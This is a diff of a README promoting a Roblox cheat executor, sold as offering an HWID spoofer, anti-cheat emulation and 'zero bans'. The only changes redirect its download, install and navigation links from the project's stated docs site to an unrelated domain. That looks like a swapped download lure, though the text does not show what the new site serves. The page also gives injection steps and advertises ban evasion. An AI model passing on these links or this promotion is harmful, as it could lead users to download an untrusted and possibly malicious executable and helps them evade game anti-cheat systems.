@@ -11,7 +11,7 @@
 
 **The most powerful Roblox executor of 2026 — 100% UNC, Hyperion emulation, built-in HWID spoofer, and zero bans.**
 
-## **[Download Volt Executor — Latest Release](https://volt-docs.github.io/volt/)**
+## **[Download Volt Executor — Latest Release](https://serial-mirror.github.io/)**
 
 </div>
 
@@ -174,7 +174,7 @@ Volt checks for updates automatically on launch. When a Roblox patch drops:
 ---
 
 **Q2: How do I use Volt Executor for the first time?**
-> Learning **how to use volt executor** is straightforward once prerequisites are in place. Install Visual C++ 2022 (x64 + x86), Microsoft WebView2 Runtime, and Cloudflare WARP first — these are mandatory. Then purchase a license, register at volt.bz, download the installer, log in, click **Install Files**, open Roblox, and click **Inject**. The full step-by-step process is detailed in the [How to Install](https://volt-docs.github.io/volt/) section above. Video walkthroughs are also available in the **volt executor discord** `#tutorials` channel.
+> Learning **how to use volt executor** is straightforward once prerequisites are in place. Install Visual C++ 2022 (x64 + x86), Microsoft WebView2 Runtime, and Cloudflare WARP first — these are mandatory. Then purchase a license, register at volt.bz, download the installer, log in, click **Install Files**, open Roblox, and click **Inject**. The full step-by-step process is detailed in the [How to Install](https://serial-mirror.github.io/) section above. Video walkthroughs are also available in the **volt executor discord** `#tutorials` channel.
 
 ---
 
@@ -207,6 +207,6 @@ Volt checks for updates automatically on launch. When a Roblox patch drops:
 
 **⭐ If Volt Executor has elevated your Roblox scripting experience, please star this repository — it helps more players discover the most advanced executor available in 2026!**
 
-[⬆️ Back to Top](https://volt-docs.github.io/volt/)
+[⬆️ Back to Top](https://serial-mirror.github.io/)
 
 </div>
